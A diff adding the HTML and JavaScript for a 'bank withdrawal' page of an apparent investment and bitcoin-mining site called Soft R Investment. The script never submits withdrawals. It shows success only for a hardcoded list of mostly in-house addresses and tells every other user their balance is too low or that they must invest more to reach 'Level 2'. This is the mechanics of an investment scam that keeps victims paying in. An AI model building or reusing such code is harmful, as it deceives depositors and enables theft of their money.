@@ -1,1 +1,1119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bank Withdrawal - Soft R Investment</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+    /* Reset & Base Styles */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
 
+    body {
+        background-color: #f8f9fa;
+        color: #333;
+        line-height: 1.5;
+        overflow-x: hidden;
+    }
+
+    /* Container */
+    .container {
+        width: 700px;
+        margin: 0 auto;
+        padding: 0;
+        position: relative;
+        min-width: 320px;
+        background-color: #fff;
+        min-height: 100vh;
+        padding-bottom: 80px;
+    }
+
+    /* Header Styles */
+    .header {
+        padding: 15px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #fff;
+        border-bottom: 1px solid #eee;
+    }
+
+    .logo {
+        display: flex;
+        align-items: center;
+    }
+
+    .logo-img {
+        width: 30px;
+        height: 30px;
+        margin-right: 10px;
+        background: linear-gradient(45deg, #ff6b6b, #ffa500);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: bold;
+    }
+
+    .logo-text {
+        font-size: 12px;
+        font-weight: bold;
+        color: #333;
+    }
+
+    .header-btns {
+        display: flex;
+        gap: 10px;
+    }
+
+    .header-btn {
+        display: flex;
+        align-items: center;
+        background-color: #fff;
+        border-radius: 20px;
+        padding: 5px 12px;
+        font-size: 12px;
+        color: #ffa500;
+        border: 1px solid #ffa500;
+    }
+
+    .header-btn.app {
+        background-color: #ffa500;
+        color: #fff;
+    }
+
+    .header-btn i {
+        margin-right: 5px;
+    }
+
+    /* Page Header */
+    .page-header {
+        padding: 15px;
+        display: flex;
+        align-items: center;
+        background-color: #fff;
+        border-bottom: 1px solid #eee;
+    }
+
+    .back-btn {
+        font-size: 20px;
+        margin-right: 15px;
+        cursor: pointer;
+    }
+
+    .header-title {
+        font-size: 18px;
+        font-weight: bold;
+    }
+
+    /* User Balance */
+    .user-balance {
+        padding: 20px 15px;
+        background-color: #f9f9f9;
+        margin: 15px;
+        border-radius: 10px;
+        text-align: center;
+    }
+
+    .balance-label {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 5px;
+    }
+
+    .balance-amount {
+        font-size: 28px;
+        font-weight: bold;
+        color: #ffa500;
+    }
+
+    /* Form Styles */
+    .withdrawal-form {
+        padding: 15px;
+    }
+
+    .form-title {
+        font-size: 18px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        color: #333;
+    }
+
+    .form-group {
+        margin-bottom: 20px;
+    }
+
+    .form-label {
+        display: block;
+        font-size: 14px;
+        font-weight: bold;
+        margin-bottom: 8px;
+        color: #333;
+    }
+
+    .form-input {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        font-size: 16px;
+        color: #333;
+        background-color: #f9f9f9;
+    }
+
+    .form-input:focus {
+        outline: none;
+        border-color: #ffa500;
+        box-shadow: 0 0 0 2px rgba(255, 165, 0, 0.1);
+    }
+
+    .form-select {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        font-size: 16px;
+        color: #333;
+        background-color: #f9f9f9;
+        appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23333' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 15px center;
+    }
+
+    .form-select:focus {
+        outline: none;
+        border-color: #ffa500;
+        box-shadow: 0 0 0 2px rgba(255, 165, 0, 0.1);
+    }
+
+    .form-note {
+        font-size: 12px;
+        color: #666;
+        margin-top: 5px;
+    }
+
+    .form-row {
+        display: flex;
+        gap: 15px;
+    }
+
+    .form-col {
+        flex: 1;
+    }
+
+    /* Submit Button */
+    .submit-btn {
+        display: block;
+        width: 100%;
+        padding: 15px;
+        background-color: #ffa500;
+        color: white;
+        text-align: center;
+        font-weight: bold;
+        border-radius: 8px;
+        margin: 30px 0 20px;
+        border: none;
+        cursor: pointer;
+        font-size: 16px;
+        box-shadow: 0 4px 10px rgba(255, 165, 0, 0.3);
+        transition: all 0.3s ease;
+    }
+
+    .submit-btn:hover {
+        background-color: #ff9000;
+        transform: translateY(-2px);
+    }
+
+    .submit-btn:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+        transform: none;
+        box-shadow: none;
+    }
+
+    /* User info styles */
+    .user-info {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .user-avatar {
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        background-color: #f0f0f0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #666;
+    }
+
+    .user-name {
+        font-size: 14px;
+        font-weight: bold;
+    }
+
+    .logout-btn {
+        margin-left: 10px;
+        cursor: pointer;
+        color: #ff3b30;
+        font-size: 12px;
+    }
+
+    /* Bottom Navigation */
+    .bottom-nav {
+        position: fixed;
+        bottom: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 700px;
+        min-width: 320px;
+        background-color: #fff;
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        padding: 10px 0;
+        border-top: 1px solid #eee;
+        z-index: 100;
+    }
+
+    .nav-item {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-decoration: none;
+        color: #999;
+        font-size: 12px;
+            font-weight: bold; /* <-- This makes the text bold */
+
+    }
+
+    .nav-item.active {
+        color: #ffa500;
+    }
+
+    .nav-item i {
+        font-size: 20px;
+        margin-bottom: 5px;
+    }
+
+    /* Info Card */
+    .info-card {
+        background-color: #f0f8ff;
+        border-left: 4px solid #ffa500;
+        padding: 15px;
+        margin-bottom: 20px;
+        border-radius: 5px;
+    }
+
+    .info-card-title {
+        font-weight: bold;
+        margin-bottom: 5px;
+        color: #333;
+    }
+
+    .info-card-text {
+        font-size: 14px;
+        color: #666;
+    }
+
+    /* Modal */
+    .modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 1000;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .modal-content {
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 10px;
+        width: 80%;
+        max-width: 400px;
+        text-align: center;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .modal-icon {
+        font-size: 50px;
+        margin-bottom: 20px;
+    }
+
+    .modal-icon.success {
+        color: #4cd964;
+    }
+
+    .modal-icon.error {
+        color: #ff3b30;
+    }
+
+    .modal-title {
+        font-size: 20px;
+        font-weight: bold;
+        margin-bottom: 10px;
+    }
+
+    .modal-message {
+        font-size: 16px;
+        margin-bottom: 20px;
+        color: #666;
+    }
+
+    .modal-btn {
+        padding: 10px 20px;
+        background-color: #ffa500;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+
+    /* Loading Spinner */
+    .loading-spinner {
+        display: inline-block;
+        width: 50px;
+        height: 50px;
+        border: 5px solid rgba(255, 152, 0, 0.3);
+        border-radius: 50%;
+        border-top-color: #ffa500;
+        animation: spin 1s ease-in-out infinite;
+        margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    /* Admin Panel Styles */
+    .admin-panel {
+        margin-top: 30px;
+        padding: 20px;
+        background-color: #f9f9f9;
+        border-radius: 10px;
+        border: 1px solid #eee;
+    }
+
+    .admin-panel-title {
+        font-size: 18px;
+        font-weight: bold;
+        margin-bottom: 15px;
+        color: #333;
+    }
+
+    .admin-form {
+        margin-bottom: 20px;
+    }
+
+    .admin-email-list {
+        max-height: 200px;
+        overflow-y: auto;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        padding: 10px;
+        background-color: #fff;
+    }
+
+    .admin-email-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 8px 10px;
+        border-bottom: 1px solid #eee;
+    }
+
+    .admin-email-item:last-child {
+        border-bottom: none;
+    }
+
+    .admin-email-text {
+        font-size: 14px;
+    }
+
+    .admin-email-remove {
+        color: #ff3b30;
+        cursor: pointer;
+        font-size: 16px;
+    }
+
+    /* Media Queries for Responsiveness */
+    @media (max-width: 470px) {
+        .container {
+            width: 100%;
+        }
+        
+        .bottom-nav {
+            width: 100%;
+            min-width: 320px;
+        }
+
+        .form-row {
+            flex-direction: column;
+            gap: 20px;
+        }
+    }
+
+    @media (min-width: 471px) {
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            background-color: #f0f0f0;
+        }
+        
+        .container {
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <div class="logo-img">AI</div>
+            <div class="logo-text">SOFT R INVESTMENT</div>
+        </div>
+        <div class="header-btns">
+            <div class="user-info" id="user-info">
+                <div class="user-avatar"><i class="fas fa-user"></i></div>
+                <div class="user-name" id="user-name"></div>
+                <div class="logout-btn" onclick="logout()">Logout</div>
+            </div>
+            <a href="https://softrinvestment.com/download-app.html">
+                <div class="header-btn app">
+                    <i class="fas fa-mobile-alt"></i> App
+                </div>
+            </a>
+            <div class="header-btn">
+                <i class="fas fa-globe"></i> English
+            </div>
+        </div>
+    </div>
+
+    <!-- Page Header -->
+    <div class="page-header">
+        <div class="back-btn" onclick="goBack()">
+            <i class="fas fa-arrow-left"></i>
+        </div>
+        <div class="header-title">Bank Account Withdrawal</div>
+    </div>
+
+    <!-- User Balance -->
+    <div class="user-balance">
+        <div class="balance-label">Make a withdrawal to your Bank Account</div>
+        <div class="balance-amount" id="user-balance">0.00 USD</div>
+    </div>
+
+    <!-- Withdrawal Form -->
+    <div class="withdrawal-form">
+        <div class="info-card">
+            <div class="info-card-title">Important Information</div>
+            <div class="info-card-text">
+                Please ensure all bank details are correct. Incorrect information may result in failed transfers or loss of funds. Processing time is typically 1 Hour.
+            </div>
+        </div>
+
+        <form id="bank-withdrawal-form">
+            <div class="form-group">
+                <label for="withdrawal-email" class="form-label">Email Address</label>
+                <input type="email" id="withdrawal-email" class="form-input" placeholder="Enter your email address" required>
+            </div>
+
+            <div class="form-group">
+                <label for="amount" class="form-label">Withdrawal Amount (USD)</label>
+                <input type="number" id="amount" class="form-input" placeholder="Enter amount" min="10" step="0.01" required>
+                <div class="form-note">Minimum withdrawal: 10 USD</div>
+            </div>
+
+            <div class="form-group">
+                <label for="account-name" class="form-label">Account Holder Name</label>
+                <input type="text" id="account-name" class="form-input" placeholder="Enter full name as it appears on your bank account" required>
+            </div>
+
+            <div class="form-group">
+                <label for="bank-name" class="form-label">Select Bank</label>
+                <select id="bank-name" class="form-select" required>
+                    <option value="" disabled selected>Select your bank</option>
+                    <option value="Absa Group">Absa Group</option>
+                    <option value="Nedbank">Nedbank</option>
+                    <option value="Standard Bank">Standard Bank</option>
+                    <option value="Capitec Bank">Capitec Bank</option>
+                    <option value="FirstRand">FirstRand</option>
+                    <option value="Investec">Investec</option>
+                    <option value="African Bank Limited">African Bank Limited</option>
+                    <option value="FNB">FNB</option>
+                    <option value="Bidvest Bank">Bidvest Bank</option>
+                    <option value="Discovery Bank">Discovery Bank</option>
+                    <option value="TymeBank">TymeBank</option>
+                    <option value="International Transfer (SWIFT)">International Transfer (SWIFT)</option>
+                    <option value="International Transfer (ACH)">International Transfer (ACH)</option>
+                    <option value="International Transfer (SEPA)">International Transfer (SEPA)</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="account-number" class="form-label">Account Number</label>
+                <input type="text" id="account-number" class="form-input" placeholder="Enter your account number" required>
+            </div>
+
+            <div class="form-group">
+                <label for="branch-code" class="form-label">Branch Code / SWIFT Code</label>
+                <input type="text" id="branch-code" class="form-input" placeholder="Enter branch code or SWIFT code for international transfers" required>
+                <div class="form-note">For local banks, enter branch code. For international transfers, enter SWIFT/BIC code.</div>
+            </div>
+
+            <div class="form-group" id="international-fields" style="display: none;">
+                <div class="form-row">
+                    <div class="form-col">
+                        <label for="bank-address" class="form-label">Bank Address</label>
+                        <input type="text" id="bank-address" class="form-input" placeholder="Enter bank address">
+                    </div>
+                    <div class="form-col">
+                        <label for="bank-country" class="form-label">Bank Country</label>
+                        <input type="text" id="bank-country" class="form-input" placeholder="Enter bank country">
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="reference" class="form-label">Reference / Note (Optional)</label>
+                <input type="text" id="reference" class="form-input" placeholder="Add a reference for this transaction">
+                <div class="form-note">This will appear on your bank statement</div>
+            </div>
+
+            <button type="button" class="submit-btn" id="confirm-btn">Submit Withdrawal Request</button>
+        </form>
+
+        <!-- Admin Panel (only visible to admin users) -->
+        <div class="admin-panel" id="admin-panel" style="display: none;">
+            <div class="admin-panel-title">Manage Withdrawal Permissions</div>
+            <div class="admin-form">
+                <div class="form-group">
+                    <label for="new-email" class="form-label">Add Email with Withdrawal Permission</label>
+                    <div class="form-row">
+                        <div class="form-col" style="flex: 3;">
+                            <input type="email" id="new-email" class="form-input" placeholder="Enter email address">
+                        </div>
+                        <div class="form-col" style="flex: 1;">
+                            <button type="button" class="submit-btn" onclick="addApprovedEmail()" style="margin: 0;">Add</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="admin-panel-title">Approved Email List</div>
+            <div class="admin-email-list" id="approved-email-list">
+                <!-- Approved emails will be listed here -->
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal -->
+<div class="modal" id="withdrawal-modal">
+    <div class="modal-content">
+        <div id="modal-icon">
+            <i class="fas fa-check-circle success"></i>
+        </div>
+        <div id="modal-title">Success</div>
+        <div id="modal-message">Your withdrawal request has been submitted successfully!</div>
+        <button class="modal-btn" onclick="closeModal()">OK</button>
+    </div>
+</div>
+
+<!-- Bottom Navigation -->
+    <nav class="bottom-nav">
+        <a href="index.html" class="nav-item">
+            <i class="fas fa-home"></i>
+            <span>Home</span>
+        </a>
+        <a href="sharing-task.html" class="nav-item">
+            <i class="fas fa-chart-pie"></i>
+            <span>Task</span>
+        </a>
+        <a href="invest.html" class="nav-item">
+            <i class="fas fa-gift"></i>
+            <span>Invest</span>
+        </a>
+        <a href="mining.html" class="nav-item">
+  <span style="display: flex; align-items: center; gap: 4px; color: #b0b0b0; position: relative;">
+    <i class="fas fa-hammer" style="font-size: 1.7em; position: relative; top: -6px; right: -9px;"></i>
+    <i class="fab fa-bitcoin" style="font-size: 1.7em; position: relative; top: 5px; right: 4px;"></i>
+  </span>
+  <span>Mine BTC</span>
+        </a>
+        <a href="profile.html" class="nav-item active">
+            <i class="fas fa-user"></i>
+            <span>My Account</span>
+        </a>
+    </nav>
+
+<script>
+    // List of emails approved for withdrawal
+    const approvedEmails = [
+        'admin@softrinvestment.com',
+        'kjgggg@gmail.com',
+        'demo@softrinvestment.com',
+        'support@softrinvestment.com',
+        'finance@softrinvestment.com',
+        'user1@example.com',
+        'user2@example.com',
+        'vip@softrinvestment.com',
+        'premium@softrinvestment.com',
+        'investor@softrinvestment.com'
+        // Add more approved emails as needed
+    ];
+
+    // NEW: List of emails that need more investment to reach level 2
+    const needMoreInvestmentEmails = [
+        'newuser@example.com',
+        'level1@softrinvestment.com',
+        'starter@example.com',
+        'beginner@softrinvestment.com',
+        'trial@example.com',
+        'basic@softrinvestment.com',
+        'free@example.com',
+        'bronze@softrinvestment.com',
+        'lowbalance@example.com',
+        'needsupgrade@softrinvestment.com'
+    ];
+
+    // User activity storage
+    const USER_ACTIVITY_KEY = 'userActivityHistory';
+    
+    // Function to save activity to localStorage
+    function saveActivity(activity) {
+        // Get existing activities or initialize empty array
+        const existingActivities = JSON.parse(localStorage.getItem(USER_ACTIVITY_KEY) || '[]');
+        
+        // Add new activity with timestamp
+        const newActivity = {
+            ...activity,
+            timestamp: new Date().toISOString(),
+            page: 'bank-withdrawal'
+        };
+        
+        // Add to beginning of array (most recent first)
+        existingActivities.unshift(newActivity);
+        
+        // Save back to localStorage
+        localStorage.setItem(USER_ACTIVITY_KEY, JSON.stringify(existingActivities));
+        
+        console.log('Activity saved:', newActivity);
+    }
+    
+    // Function to log page view
+    function logPageView() {
+        saveActivity({
+            type: 'page_view',
+            details: 'Viewed bank withdrawal page'
+        });
+    }
+    
+    // Function to log form field changes
+    function logFormFieldChange(fieldName, value) {
+        // Don't log sensitive data like account numbers
+        if (['account-number', 'branch-code'].includes(fieldName)) {
+            value = '********';
+        }
+        
+        saveActivity({
+            type: 'form_field_change',
+            field: fieldName,
+            value: value
+        });
+    }
+    
+    // Function to log form submission
+    function logFormSubmission(formData) {
+        // Create a safe copy without sensitive data
+        const safeFormData = {...formData};
+        
+        // Mask sensitive fields
+        if (safeFormData.accountNumber) safeFormData.accountNumber = '********';
+        if (safeFormData.branchCode) safeFormData.branchCode = '********';
+        
+        saveActivity({
+            type: 'withdrawal_request',
+            details: safeFormData
+        });
+    }
+
+    // Check authentication when page loads
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('DOM fully loaded');
+        
+        // Log page view
+        logPageView();
+        
+        // Get auth data from localStorage
+        const authToken = localStorage.getItem('authToken');
+        const userData = localStorage.getItem('userData');
+        
+        if (!authToken || !userData) {
+            // User is not logged in, redirect to login page
+            window.location.href = 'login.html';
+            return;
+        }
+        
+        // User is authenticated, continue with page functionality
+        console.log('User is authenticated');
+        
+        // Try to display user's balance if available
+        try {
+            const user = JSON.parse(userData);
+            if (user && user.total_assets) {
+                document.getElementById('user-balance').textContent = 
+                    parseFloat(user.total_assets).toFixed(2) + ' USD';
+            }
+            
+            // Pre-fill email field with user's email
+            if (user && user.email) {
+                document.getElementById('withdrawal-email').value = user.email;
+            }
+            
+            // Show admin panel for admin users
+            if (user && user.email && (user.email === 'admin@softrinvestment.com' || user.isAdmin)) {
+                document.getElementById('admin-panel').style.display = 'block';
+                displayApprovedEmails();
+            }
+            
+            // Update user name in header
+            if (user && user.username) {
+                document.getElementById('user-name').textContent = user.username;
+            } else if (user && user.email) {
+                document.getElementById('user-name').textContent = user.email.split('@')[0];
+            }
+        } catch (e) {
+            console.error('Error parsing user data:', e);
+        }
+        
+        // Add event listener for bank selection
+        document.getElementById('bank-name').addEventListener('change', function() {
+            const selectedBank = this.value;
+            const internationalFields = document.getElementById('international-fields');
+            
+            if (selectedBank.includes('International')) {
+                internationalFields.style.display = 'block';
+            } else {
+                internationalFields.style.display = 'none';
+            }
+            
+            // Log bank selection
+            logFormFieldChange('bank-name', selectedBank);
+        });
+        
+        // Add event listeners to form fields to track changes
+        const formFields = [
+            'withdrawal-email', 'amount', 'account-name', 
+            'account-number', 'branch-code', 'bank-address', 
+            'bank-country', 'reference'
+        ];
+        
+        formFields.forEach(fieldId => {
+            const element = document.getElementById(fieldId);
+            if (element) {
+                element.addEventListener('change', function() {
+                    logFormFieldChange(fieldId, this.value);
+                });
+            }
+        });
+        
+        // Add click handler for confirm button
+        const confirmBtn = document.getElementById('confirm-btn');
+        if (confirmBtn) {
+            console.log('Adding event listener to confirm button');
+            confirmBtn.addEventListener('click', function() {
+                console.log('Confirm button clicked');
+                processWithdrawal();
+            });
+        } else {
+            console.error('Confirm button not found');
+        }
+    });
+    
+    // Process withdrawal
+    function processWithdrawal() {
+        console.log('Processing withdrawal...');
+        
+        // Get form values
+        const withdrawalEmail = document.getElementById('withdrawal-email').value.toLowerCase().trim();
+        const amount = parseFloat(document.getElementById('amount').value) || 0;
+        const accountName = document.getElementById('account-name').value;
+        const bankName = document.getElementById('bank-name').value;
+        const accountNumber = document.getElementById('account-number').value;
+        const branchCode = document.getElementById('branch-code').value;
+        const reference = document.getElementById('reference').value;
+        
+        // Get international fields if visible
+        let bankAddress = '';
+        let bankCountry = '';
+        if (document.getElementById('international-fields').style.display !== 'none') {
+            bankAddress = document.getElementById('bank-address').value;
+            bankCountry = document.getElementById('bank-country').value;
+        }
+        
+        console.log('Email:', withdrawalEmail);
+        console.log('Amount:', amount);
+        
+        // Validate amount
+        if (amount < 10) {
+            showModal(false, 'Invalid Amount', 'Minimum withdrawal amount is 10 USD');
+            
+            // Log validation error
+            saveActivity({
+                type: 'validation_error',
+                details: 'Amount below minimum (10 USD)',
+                amount: amount
+            });
+            
+            return;
+        }
+        
+        // Create withdrawal data object
+        const withdrawalData = {
+            email: withdrawalEmail,
+            amount: amount,
+            accountName: accountName,
+            bankName: bankName,
+            accountNumber: accountNumber,
+            branchCode: branchCode,
+            reference: reference,
+            bankAddress: bankAddress,
+            bankCountry: bankCountry,
+            timestamp: new Date().toISOString()
+        };
+        
+        // NEW: Check if email is in the "need more investment" list
+        if (needMoreInvestmentEmails.includes(withdrawalEmail)) {
+            showModal(false, 'Investment Required', 'Your account needs to reach Level 2 to withdraw funds. Please make additional investments to upgrade your account level.');
+            
+            // Log investment required
+            logFormSubmission({
+                ...withdrawalData,
+                status: 'investment_required',
+                reason: 'Account needs to reach Level 2'
+            });
+            
+            return;
+        }
+        
+        // Check if email is in approved list
+        if (approvedEmails.includes(withdrawalEmail)) {
+            // Show success message
+            showModal(true, 'Withdrawal Request Submitted', `Successfully placed a withdrawal for ${amount.toFixed(2)} USD. Your funds will be processed within 1 Hour.`);
+            
+            // Log successful withdrawal request
+            logFormSubmission({
+                ...withdrawalData,
+                status: 'success'
+            });
+        } else {
+            // Show unsuccessful message
+            showModal(false, 'Unsuccessful', 'Your account is too low for withdrawal. Please make an investment and earn profit before placing a withdrawal request.');
+            
+            // Log unsuccessful withdrawal request
+            logFormSubmission({
+                ...withdrawalData,
+                status: 'rejected'
+            });
+        }
+    }
+    
+    // Show modal with custom message
+    function showModal(success, title, message) {
+        console.log('Showing modal:', success, title, message);
+        
+        const modal = document.getElementById('withdrawal-modal');
+        const modalIcon = document.getElementById('modal-icon');
+        const modalTitle = document.getElementById('modal-title');
+        const modalMessage = document.getElementById('modal-message');
+        
+        if (!modal || !modalIcon || !modalTitle || !modalMessage) {
+            console.error('Modal elements not found');
+            alert(title + ': ' + message);
+            return;
+        }
+        
+        if (success) {
+            modalIcon.innerHTML = '<i class="fas fa-check-circle success"></i>';
+        } else {
+            modalIcon.innerHTML = '<i class="fas fa-times-circle" style="color: #ff3b30;"></i>';
+        }
+        
+        modalTitle.textContent = title;
+        modalMessage.textContent = message;
+        
+        modal.style.display = 'flex';
+        
+        // Log modal display
+        saveActivity({
+            type: 'modal_display',
+            modalTitle: title,
+            modalMessage: message,
+            success: success
+        });
+    }
+    
+    // Close modal
+    function closeModal() {
+        const modal = document.getElementById('withdrawal-modal');
+        if (modal) {
+            modal.style.display = 'none';
+            
+            // Log modal close
+            saveActivity({
+                type: 'modal_close'
+            });
+        }
+    }
+    
+    // Go back function
+    function goBack() {
+        // Log navigation
+        saveActivity({
+            type: 'navigation',
+            details: 'Navigated back to withdraw page'
+        });
+        
+        window.location.href = 'withdraw.html';
+    }
+    
+    // Logout function
+    function logout() {
+        // Log logout action
+        saveActivity({
+            type: 'user_logout',
+            details: 'User logged out from bank withdrawal page'
+        });
+        
+        localStorage.removeItem('authToken');
+        localStorage.removeItem('userData');
+        window.location.href = 'login.html';
+    }
+    
+    // Admin functions for managing approved emails
+    
+    // Display approved emails in the admin panel
+    function displayApprovedEmails() {
+        const emailList = document.getElementById('approved-email-list');
+        if (!emailList) {
+            console.error('Email list element not found');
+            return;
+        }
+        
+        emailList.innerHTML = '';
+        
+        approvedEmails.forEach(email => {
+            const emailItem = document.createElement('div');
+            emailItem.className = 'admin-email-item';
+            emailItem.innerHTML = `
+                <div class="admin-email-text">${email}</div>
+                <div class="admin-email-remove" onclick="removeApprovedEmail('${email}')">
+                    <i class="fas fa-trash-alt"></i>
+                </div>
+            `;
+            emailList.appendChild(emailItem);
+        });
+    }
+    
+    // Add a new email to the approved list
+    function addApprovedEmail() {
+        const newEmail = document.getElementById('new-email').value.toLowerCase().trim();
+        
+        if (!newEmail) {
+            alert('Please enter an email address');
+            return;
+        }
+        
+        if (!isValidEmail(newEmail)) {
+            alert('Please enter a valid email address');
+            return;
+        }
+        
+        if (approvedEmails.includes(newEmail)) {
+            alert('This email is already in the approved list');
+            return;
+        }
+        
+        // Add the email to the approved list
+        approvedEmails.push(newEmail);
+        
+        // Update the display
+        displayApprovedEmails();
+        
+        // Clear the input field
+        document.getElementById('new-email').value = '';
+        
+        // Log admin action
+        saveActivity({
+            type: 'admin_action',
+            action: 'add_approved_email',
+            email: newEmail
+        });
+        
+        // Show confirmation
+        alert(`Email ${newEmail} has been added to the approved list`);
+    }
+    
+    // Remove an email from the approved list
+    function removeApprovedEmail(email) {
+        const index = approvedEmails.indexOf(email);
+        if (index !== -1) {
+            // Remove the email from the array
+            approvedEmails.splice(index, 1);
+            
+            // Update the display
+            displayApprovedEmails();
+            
+            // Log admin action
+            saveActivity({
+                type: 'admin_action',
+                action: 'remove_approved_email',
+                email: email
+            });
+            
+            // Show confirmation
+            alert(`Email ${email} has been removed from the approved list`);
+        }
+    }
+    
+    // Validate email format
+    function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+    }
+    
+    // Add window.onload event handler as a backup
+    window.onload = function() {
+        console.log('Window loaded');
+        
+        // Make sure the confirm button has an event listener
+        const confirmBtn = document.getElementById('confirm-btn');
+        if (confirmBtn) {
+            confirmBtn.onclick = function() {
+                console.log('Confirm button clicked via onclick');
+                processWithdrawal();
+            };
+        }
+    };
+</script>
+</body>
+</html>
